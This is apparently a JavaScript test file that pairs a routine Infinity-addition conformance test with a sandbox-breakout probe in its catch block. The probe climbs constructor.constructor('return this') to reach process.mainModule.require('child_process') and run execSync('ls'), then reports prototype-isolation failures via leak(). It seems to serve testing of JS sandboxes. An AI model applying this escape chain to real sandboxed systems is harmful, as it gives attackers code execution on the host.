try {
    if (Number.POSITIVE_INFINITY + 1 !== Number.POSITIVE_INFINITY) {
        $ERROR('#1: Infinity + 1 === Infinity. Actual: ' + (Infinity + 1));
    }
    if (-1 + Number.POSITIVE_INFINITY !== Number.POSITIVE_INFINITY) {
        $ERROR('#2: -1 + Infinity === Infinity. Actual: ' + (-1 + Infinity));
    }
    if (Number.NEGATIVE_INFINITY + 1 !== Number.NEGATIVE_INFINITY) {
        $ERROR('#3: -Infinity + 1 === -Infinity. Actual: ' + (-Infinity + 1));
    }
    if (-1 + Number.NEGATIVE_INFINITY !== Number.NEGATIVE_INFINITY) {
        $ERROR('#4: -1 + -Infinity === -Infinity. Actual: ' + (-1 + -Infinity));
    }
    if (Number.POSITIVE_INFINITY + Number.MAX_VALUE !== Number.POSITIVE_INFINITY) {
        $ERROR('#5: Infinity + Number.MAX_VALUE === Infinity. Actual: ' + (Infinity + Number.MAX_VALUE));
    }
    if (-Number.MAX_VALUE + Number.POSITIVE_INFINITY !== Number.POSITIVE_INFINITY) {
        $ERROR('#6: -Number.MAX_VALUE + Infinity === Infinity. Actual: ' + (-Number.MAX_VALUE + Infinity));
    }
    if (Number.NEGATIVE_INFINITY + Number.MAX_VALUE !== Number.NEGATIVE_INFINITY) {
        $ERROR('#7: -Infinity + Number.MAX_VALUE === -Infinity. Actual: ' + (-Infinity + Number.MAX_VALUE));
    }
    if (-Number.MAX_VALUE + Number.NEGATIVE_INFINITY !== Number.NEGATIVE_INFINITY) {
        $ERROR('#8: -Number.MAX_VALUE + -Infinity === -Infinity. Actual: ' + (-Number.MAX_VALUE + -Infinity));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}